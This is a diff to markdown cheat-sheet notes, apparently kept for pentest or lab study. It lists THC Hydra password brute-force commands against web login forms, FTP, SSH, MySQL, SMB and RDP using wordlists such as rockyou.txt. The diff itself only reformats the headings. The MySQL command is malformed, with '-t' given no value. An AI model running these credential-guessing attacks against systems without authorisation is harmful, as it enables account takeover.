@@ -1,6 +1,6 @@
-## Brute Force THCHydra
+# Brute Force THCHydra
 
-# HTTP Post Web Form
+## HTTP Post Web Form
 
 $ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
 
@@ -12,13 +12,13 @@ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.4.149 http-post-form "
 
 $ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
 
-# FTP
+## FTP
 
 $ hydra -l user-name -P /dir/passlist.txt <IP Address> ftp
 
 $ hydra -L /dir/users.txt -P /dir/passlist.txt ftp://<IP_Address>
 
-# SSH
+## SSH
 
 $ hydra -l <username> -P <full path to passlist.txt> <IP Address Target> -t 4 ssh
 
@@ -26,15 +26,16 @@ $ hydra -L <full path to usernamelist.txt> -P <full path to passlist.txt> ssh://
 
 $ hydra -f -l user -P /usr/share/wordlists/rockyou.txt <IP Address Target> -t 4 ssh
 
-# MySQL
+## MySQL
 
 $ hydra -f -l user -P /usr/share/wordlists/rockyou.txt <IP Address Target> -t mysql
 
-# SMB
+## SMB
 
 $ hydra -f -l user -P /usr/share/wordlists/rockyou.txt <IP Address Target> -t 4 smb
 
-# RDP
+## RDP
+
 $ hydra -l <username> -P <full path to passlist.txt> <IP Address> rdp
 
 $ hydra -L <full/path_to_usernamelist.txt> -P <full/path_to_passlist.txt> -t 4 -W 3 rdp://IP_Address:3389/
